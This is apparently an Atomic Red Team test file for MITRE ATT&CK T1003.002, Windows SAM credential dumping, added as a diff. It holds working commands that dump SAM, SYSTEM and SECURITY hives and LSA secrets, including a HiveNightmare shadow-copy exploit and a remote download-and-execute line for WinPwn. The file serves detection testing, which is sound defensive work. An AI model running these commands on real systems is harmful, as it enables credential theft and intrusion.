@@ -1,0 +1,192 @@
+attack_technique: T1003.002
+display_name: "OS Credential Dumping: Security Account Manager"
+atomic_tests:
+- name: Registry dump of SAM, creds, and secrets
+  auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
+  description: |
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
+    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
+    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg save HKLM\sam %temp%\sam
+      reg save HKLM\system %temp%\system
+      reg save HKLM\security %temp%\security
+    cleanup_command: |
+      del %temp%\sam >nul 2> nul
+      del %temp%\system >nul 2> nul
+      del %temp%\security >nul 2> nul
+    name: command_prompt
+    elevation_required: true
+
+- name: Registry parse with pypykatz
+  auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
+  description: |
+    Parses registry hives to obtain stored credentials.
+
+    Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
+  supported_platforms:
+  - windows
+  input_arguments:
+    venv_path:
+      description: Path to the folder for the tactics venv
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Computer must have python 3 installed
+    prereq_command: |
+      if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+      invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+      Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+  - description: |
+      Computer must have venv configured at #{venv_path}
+    prereq_command: |
+      if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      py -m venv "#{venv_path}"
+  - description: |
+      pypykatz must be installed 
+    prereq_command: |
+      if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      & "#{venv_path}\Scripts\pip.exe" install --no-cache-dir pypykatz 2>&1 | Out-Null
+  executor:
+    command: |
+      "#{venv_path}\Scripts\pypykatz" live lsa 
+    name: command_prompt
+    elevation_required: true
+- name: esentutl.exe SAM copy
+  auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
+  description: |
+    Copy the SAM hive using the esentutl.exe utility
+    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: Path to the file to copy
+      type: path
+      default: '%SystemRoot%/system32/config/SAM'
+    file_name:
+      description: Name of the copied file
+      type: string
+      default: SAM
+    copy_dest:
+      description: Destination of the copied file
+      type: string
+      default: '%temp%'
+  executor:
+    command: |
+      esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
+    name: command_prompt
+    elevation_required: true
+    cleanup_command: |
+      del #{copy_dest}\#{file_name} >nul 2>&1
+
+- name: PowerDump Hashes and Usernames from Registry
+  auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
+  description: Executes a hashdump by reading the hashes from the registry.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: PowerDump script must exist on disk at specified location
+    prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1") {exit 0} else {exit 1} '
+    get_prereq_command: |-
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+      Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
+  executor:
+    command: |-
+      Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+      Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
+      Invoke-PowerDump
+    name: powershell
+    elevation_required: true
+
+- name: dump volume shadow copy hives with certutil
+  auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+  description: |
+    Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
+    This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_hive:
+      description: Hive you wish to dump
+      type: string
+      default: SAM
+    limit:
+      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      type: integer
+      default: 10
+  executor:
+    command: |
+      for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
+    name: command_prompt
+    elevation_required: false
+    cleanup_command: |
+      for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
+
+- name: dump volume shadow copy hives with System.IO.File
+  auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+  description: |
+    Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_hive:
+      description: Hive you wish to dump
+      type: string
+      default: SAM
+    limit:
+      description: Limit to the number of shadow copies to iterate through when trying to copy the hive
+      type: integer
+      default: 10
+  executor:
+    command: |
+      1..#{limit} | % { 
+       try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}" , "$env:TEMP\#{target_hive}vss$_", "true") } catch {}
+       ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
+      }
+    name: powershell
+    elevation_required: false
+    cleanup_command: |
+      1..#{limit} | % {
+        rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore
+      }
+
+- name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
+  auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
+  description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      samfile -consoleoutput -noninteractive  
+    name: powershell
+
+- name: Dumping of SAM, creds, and secrets(Reg Export)
+  auto_generated_guid: 21df41be-cdd8-4695-a650-c3981113aa3c
+  description: |
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
+    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg export HKLM\sam %temp%\sam
+      reg export HKLM\system %temp%\system
+      reg export HKLM\security %temp%\security
+    cleanup_command: |
+      del %temp%\sam >nul 2> nul
+      del %temp%\system >nul 2> nul
+      del %temp%\security >nul 2> nul
+    name: command_prompt
+    elevation_required: true
